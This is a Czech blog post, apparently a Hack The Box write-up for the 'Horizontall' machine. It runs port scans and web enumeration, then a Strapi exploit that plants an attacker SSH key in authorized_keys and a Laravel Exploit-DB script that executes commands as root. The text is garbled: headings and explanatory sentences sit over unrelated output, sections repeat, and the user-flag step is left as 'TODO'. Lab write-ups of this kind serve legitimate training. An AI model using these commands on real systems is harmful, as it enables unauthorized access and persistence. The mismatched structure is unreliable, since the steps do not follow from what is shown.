---
layout: post
author: Tomáš Matějíček
title: "Horizontall"
date: 2020-12-04
tags: linux ssh php exploit enumeration privesc
---
[Horizontall](https://www.hackthebox.com/home/machines/profile/374) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT      STATE  SERVICE      VERSION
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`22/tcp    open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)`
```
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp    open   http         nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
```

### Identifikace a hledání exploitu
Zjišťuji technologii a ověřuji známé zranitelnosti.
`whatweb -v http://api-prod.horizontall.htb`
```
=> Strapi <strapi.io> (from x-powered-by string)
```

### Enumerace webu
Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
`./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r`
```
=> http://api-prod.horizontall.htb/admin/
```

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`python3 Strapi.py http://api-prod.horizontall.htb`
```
mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa __CENSORED__= hack@kali" >> ~/.ssh/authorized_keys && echo ssh-rsa __CENSORED__= hack@kali >> ~/.ssh/authorized_keys
```

### Identifikace a hledání exploitu (2)
Zjišťuji technologii a ověřuji známé zranitelnosti.
`searchsploit laravel`

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log "cat /root/root.txt"`
```
__CENSORED__
```

### Získání user flagu
`TODO`
